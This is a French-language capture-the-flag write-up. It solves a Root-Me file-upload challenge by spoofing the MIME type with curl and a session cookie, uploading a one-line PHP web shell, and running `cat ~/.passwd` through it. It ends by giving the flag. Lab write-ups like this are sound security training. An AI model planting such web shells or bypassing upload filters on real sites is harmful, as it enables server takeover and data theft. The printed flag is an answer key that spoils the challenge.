## Challenges

### Serveur Web

### Challenge: File upload_Type MIME.md

#### Problème

Cette épreuve consiste à uploader un code PHP dans cette galerie de photos.

#### Résolution

Pour commencer ce défi, accédez à la page. Cliquez sur "upload", ce qui vous redirigera vers une page permettant de télécharger une image.
Remarque sur la page :
** NB : seuls les fichiers GIF, JPEG ou PNG sont acceptés **

En cliquant sur "choose file", vous pouvez choisir le fichier à télécharger.

Si vous choisissez un fichier.php, un message s'affichera :

** Wrong file type ! **

Nous allons contourner cette protection, qui semble être basée uniquement sur le champ Content-type.

Cliquez sur "F12", puis dans l'onglet "Application", cliquez sur "Cookies". Sélectionnez le fichier qui s'affiche et copiez la valeur du cookie "1b69ad9be6ea1f38e0b33a32b0a1ad16".

Dans le terminal, tapez la commande suivante :

Shell Ubunto: 

```shell
curl -i -F "file=@test.php;type=image/gif" --cookie "PHPSESSID=1b69ad9be6ea1f38e0b33a32b0a1ad16" "http://challenge01.root-me.org/web-serveur/ch21/?action=upload"
```

Le fichier test.php contient le code suivant :

```php
<?php
system($_GET['command']);
?>
```

Donc le fichier est bien uploadé sur le serveur, pour le vérifier vous pouvez accéder à l'URL suivante :

```
http://challenge01.root-me.org/web-serveur/ch21/?galerie=uploads/
```

On clique sur le fichier test.php, puis on ajoute la commande suivante à l'URL :

```shell
http://challenge01.root-me.org/web-serveur/ch21/?galerie=uploads/1b69ad9be6ea1f38e0b33a32b0a1ad16//test.php?command=cat ~/.passwd
```

Le flag s'affiche dans la page.

#### Solution

Le flag est : `a7n4nizpgQgnPERy89uanf6T4`.